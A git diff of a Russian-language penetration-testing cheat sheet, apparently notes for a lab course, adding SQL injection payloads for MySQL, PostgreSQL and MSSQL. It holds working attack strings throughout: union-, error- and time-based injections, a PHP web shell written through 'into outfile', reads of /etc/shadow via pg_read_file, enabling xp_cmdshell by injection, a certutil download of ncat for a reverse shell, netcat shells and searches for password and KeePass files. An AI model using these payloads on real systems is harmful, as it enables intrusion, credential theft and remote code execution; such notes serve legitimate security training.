@@ -65,6 +65,7 @@ dnsrecon -r 127.0.0.0/24 -n 192.168.43.226 -d dd
 	, принадлежащих диапазону ip адресов 127.0.0.1-127.0.0.255
 find / -type f -perm 4000 2>/dev/null
 	поиск фалов с SUID (2000 для SGID и 1000 для Sticky bit)
+dir /s /b C:\*flag* 2>nul
 
 ===============SHELL
 BIND shell:	nc <victim ip> 4444	-->	nc -lvp 4444 -e /bin/sh
@@ -133,6 +134,7 @@ net view \\dc01 /all		просмотр доступных ресурсов (SMB) на машине dc01
 net localgroup [administrators]
 findstr /si "password=" *.txt *.ini *.config
 dir *.kdbx /s	поиск файлов в подпапках из текущей
+dir /s /b C:\*flag* 2>nul
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 		тоже самое в powershell
 Get-LocalUser
@@ -253,11 +255,22 @@ cmd=cmd.exe /c "cd /d %TEMP% && certutil -urlcache -split -f http://192.168.45.2
 	reverse shell, если есть только cmd.exe, надо повесить python -m http.server на папку с ncat.exe, открыть порт nc -lvp 4444
 
 ================SQL INJECTION. MySQL 3306
+ПОРЯДОК проверки SQLi:
+1) error-based: ' or 1=1 -- //"
+2) union-based: ' ORDER BY 6 -- // --> ' UNION select 1, 2 -- // 
+3) boolean-based: ' and 1=1 --  // должен вернуть данные, and 1=2 - не должен вернуть данные
+4) time-based: ' and if(1=1,sleep(3),0)
+SELECT * FROM users WHERE username = '[INPUT]' 		=> ' or 1=1 -- //	MSSQL, MySQL, PostgreSQL, Oracle
+SELECT * FROM users WHERE (username = '[INPUT]') 	=> ') or 1=1 -- //	
+SELECT * FROM users WHERE username = "[INPUT]"  	=> " or 1=1 -- //	Oracle, PostgreSQL?, MSSQL?
+SELECT * FROM users WHERE (username = "[INPUT]")	=> ") or 1=1 -- //
+
 mysql -u root -p 'root' -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert
 	подключение к MySQL, команды: "show databases;", "select table_name from information_schema.tables;"
 	"show tables from information_schema;" = "SELECT schema_name FROM information_schema.schemata;"
 	describe (= show columns from) <table name> - получить описание структуры ("describe information_schema.tables")
 	таблицы information_schema: schemata (инфа о базах), tables, columns (колонки table_name, column_name, table_schema)
+CAST()			-- преобразование типов
 select version()	-- версия
 select user()  		-- = system_user(), подключенный пользователь @ хост, с которого он подключился
 select database()	-- текущая БД
@@ -272,6 +285,7 @@ select load_file('/etc/passwd')  -- // чтение файла (нужны права)
 	если system() заблокирована
 ' union select ' \"<?php system(\$_GET['cmd']);?>\"' into outfile 'C:\\Windows\\Temp\\shell.php' -- //
 	запись в файл (нужны права, файл не должен существовать), проверять количество столбцов не обязательно, но желательно
+
 ' or 1=1 -- //	хотя бы 1 пробел после --
 ' or '1'='1 	для того, чтобы не ломать запрос и не коментить конец запроса	
 ' or 1=1 in (select version()) -- //
@@ -281,7 +295,7 @@ select load_file('/etc/passwd')  -- // чтение файла (нужны права)
 ' or 1=1 in (select column_name	from information_schema.columns	WHERE table_name='users') -- // колонки в таблице users в БД offsec
 ' or 1=1 in (select username from users) -- //
 
-' ORDER BY 6-- // проверить количество колонок в используемом запросе - надо выровнять с количеством колонок в основном запросе
+' ORDER BY 6 -- // проверить количество колонок в используемом запросе - надо выровнять с количеством колонок в основном запросе
 %' UNION SELECT null, database(), user(), version(), null -- // % - любое количество любых символ (_ - 1 символ)
 ' UNION select 1, 2, 3, 4, schema_name, 6 from information_schema.schemata -- // список всех БД
 ' UNION select null, table_name, database(), null, null		from information_schema.tables 	WHERE table_schema=database() -- //
@@ -299,6 +313,24 @@ sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
 	--web-root - доступная на запись директория
 wpscan --url http://alvida-eatery.local/ --api-token TlTUbNppqaZ2NrsS6jFlH27Voc7iAy1jW3yPtFCzmfM
 	сканирование сайта, поиск уязвимостей движка word press (плагины, пользователи, открытые директории)
+
+================SQL INJECTION. PostgreSQL 5432
+' or 1=1 --+
+' and+(select pg_sleep(15)) is null --+
+	проверка слепой инъекции
+' and 1=cast(version() as int) --+
+	в postgresql нельзя сравнивать разные типы, вывод для слепой инъекции
+' ORDER BY 6 -- // 
+'+union+select+null,cast(current_user+as+int),null,null,null,null+--
+' and 1=cast(current_database() as int) -- //	вывод данных через ошибку, текущая БД
+' and 1=cast(current_schema() as int) -- //	вывод текущей схемы текущей БД
+' and 1=cast((select string_agg(datname, ', ') from pg_database) as int) -- // вывод всех БД на сервере
+' and 1=cast((select string_agg(schema_name, ', ') from information_schema.schemata) as int) -- // вывод всех схем текущей БД
+' and 1=cast((select string_agg(table_name, ', ') from information_schema.tables where table_schema='public') as int) -- // таблицы
+' and 1=cast((select string_agg(column_name, ', ') from information_schema.columns where table_name='users') as int) -- // колонки
+' and 1=cast((select string_agg(weight||'|'||height||'|'||created_at||'|'||active||'|'||gender||'|'||email, '; ') from users) as int) -- //
+' and 1=cast(pg_read_file('/etc/shadow') as int) -- // чтение файлов - единственное, что обычно может быть доступно в PostgreSQL
+
 ================SQL INJECTION. MSSQL 1433
 impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
 	подключение в MSSQL, системные команды: "select @@version", "SELECT name FROM sys.databases;"
@@ -308,12 +340,22 @@ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
 		SELECT * FROM master.sys.views; - также вывести представления (view, виртуальные таблицы)
 	select * from model.information_schema.tables; - универсальный запрос просмотра таблиц в БД model
 	select * from offsec.dbo.users; - обращение к таблице в формате <БД>.<схема>.<таблица>	
+' and 1=convert(int,@@version) -- // проверка инъекции
+' or @@version like '%' -- //
+' union select @@version,null -- //
+'; if 1=1 waitfor delay '00:00:05' -- // 
+'; if user_name()='dbo' waitfor delay '00:00:05' -- // Database Owner, есть права на xp_cmdshell
+'; if is_srvrolemember('sysadmin')=1 waitfor delay '00:00:05' -- // роль sysadmin, полные права на БД 
+'; if has_perms_by_name(null, null, 'EXECUTE')=1 waitfor delay '00:00:05' -- // проверка прав на исполнение
+
 Активация работы функции xp_cmdshell:
-	EXECUTE sp_configure 'show advanced options', 1;
-	RECONFIGURE;
-	EXECUTE sp_configure 'xp_cmdshell', 1;
-	RECONFIGURE;
-	EXECUTE xp_cmdshell 'whoami';	запуск команды
+'; EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; -- //
+'; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- //
+'; EXECUTE xp_cmdshell 'ping -n 5 127.0.0.1'; -- // проверка, что появилась возможность выполнять xp_cmdshell
+'; EXECUTE xp_cmdshell 'whoami';	запуск команды
+Проверка результата, когда надо проверить какую строку вывела команда
+CREATE TABLE #tmp (output VARCHAR(1000)); INSERT INTO #tmp EXECUTE xp_cmdshell 'whoami'; 
+IF (SELECT TOP 1 output FROM #tmp) = 'NT SERVICE\MSSQL$SQLEXPRESS' waitfor delay '00:00:05'; DROP TABLE #tmp; 
 
 
 ================FUZZING
